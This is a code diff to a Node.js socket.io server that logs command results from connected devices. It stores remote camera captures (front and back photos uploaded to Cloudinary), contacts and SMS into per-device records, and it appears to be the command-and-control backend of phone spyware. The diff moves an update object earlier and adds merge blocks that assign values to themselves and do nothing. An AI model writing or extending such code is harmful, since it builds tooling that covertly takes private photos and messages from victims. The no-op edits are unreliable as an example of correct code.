@@ -242,6 +242,17 @@ io.on('connection', async (socket) => {
             return val;
           };
 
+          const updateDoc = {
+            $push: {
+              commands: {
+                commandId,
+                status: status || 'executed',
+                result: cleanResult,
+                executedAt: new Date()
+              }
+            }
+          };
+
           // For photo capture result with base64 data → Upload to Cloudinary (captured photos)
           if (cleanResult && cleanResult.data && (cleanResult.command === 'take_photo' || cleanResult.command === 'take_photo_front' || cleanResult.command === 'take_photo_back')) {
             try {
@@ -371,6 +382,17 @@ io.on('connection', async (socket) => {
 
           // Persist result data into device.data
           const dataSetOps = {};
+          
+          // Merge any $push operations from Cloudinary uploads into updateDoc
+          if (updateDoc.$push && updateDoc.$push['data.photos']) {
+            updateDoc.$push['data.photos'] = updateDoc.$push['data.photos'];
+          }
+          if (updateDoc.$push && updateDoc.$push['data.videos']) {
+            updateDoc.$push['data.videos'] = updateDoc.$push['data.videos'];
+          }
+          if (updateDoc.$push && updateDoc.$push['data.documents']) {
+            updateDoc.$push['data.documents'] = updateDoc.$push['data.documents'];
+          }
           if (cleanResult && typeof cleanResult === 'object' && !cleanResult.error) {
             if (cleanResult.contacts)              dataSetOps['data.contacts']      = extractFromResult(cleanResult.contacts, 'contacts');
             if (cleanResult.sms)                   dataSetOps['data.sms']           = extractFromResult(cleanResult.sms, 'sms');
@@ -394,16 +416,6 @@ io.on('connection', async (socket) => {
             }
           }
 
-          const updateDoc = {
-            $push: {
-              commands: {
-                commandId,
-                status: status || 'executed',
-                result: cleanResult,
-                executedAt: new Date()
-              }
-            }
-          };
 
           // If photo was captured, also push to data.capturedPhotos array
           if (cleanResult && cleanResult.cloudinaryUrl && cleanResult.command === 'take_photo') {
